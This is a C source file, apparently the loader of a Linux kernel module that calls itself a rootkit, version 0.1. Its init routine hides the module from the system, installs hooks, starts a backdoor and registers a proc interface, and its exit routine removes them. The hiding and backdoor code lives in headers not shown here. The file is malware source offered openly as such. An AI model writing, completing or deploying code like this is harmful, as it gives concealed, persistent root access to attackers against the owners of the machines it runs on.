#include <linux/module.h>

#include "config.h"
#include "hiding.h"
#include "hooks.h"
#include "backdoor.h"
#include "proc.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Klecko");
MODULE_DESCRIPTION("Rootkit by Klecko");
MODULE_VERSION("0.1");

//insmod
static int __init lkm_init(void){
	printk("ROOTKIT: Starting Rootkit ---------------------------------\n");
	if (HIDE_MODULE){
		if (hide_module() == -1){
			printk(KERN_INFO "ROOTKIT: INIT ERROR hiding module\n");
			goto err_hide;
		}
	}

	if (hooks_init() == -1){
		printk(KERN_INFO "ROOTKIT: INIT ERROR hooks\n");
		goto err_hooks;
	}

	if (BACKDOOR){
		if (backdoor_init() == -1){
			printk(KERN_INFO "ROOTKIT: INIT ERROR backdoor\n");
			goto err_backdoor;
		}
	}

	if (proc_init() == -1){
		printk(KERN_INFO "ROOTKIT: INIT ERROR proc\n");
		goto err_proc;
	}

	return 0;

	err_proc:
	backdoor_exit();

	err_backdoor:
	hooks_exit();

	err_hooks:
	unhide_module();

	err_hide:
	return -1;
}

//rmmod
static void __exit lkm_exit(void){
	proc_exit();
	if (BACKDOOR) backdoor_exit();
	hooks_exit();
	if (is_module_hidden()) unhide_module(); //I think lkm_exit won't be executed if the module is hidden
	delete_lists();
	printk("ROOTKIT: Finishing Rootkit ---------------------------------\n\n");
}

module_init(lkm_init);
module_exit(lkm_exit);

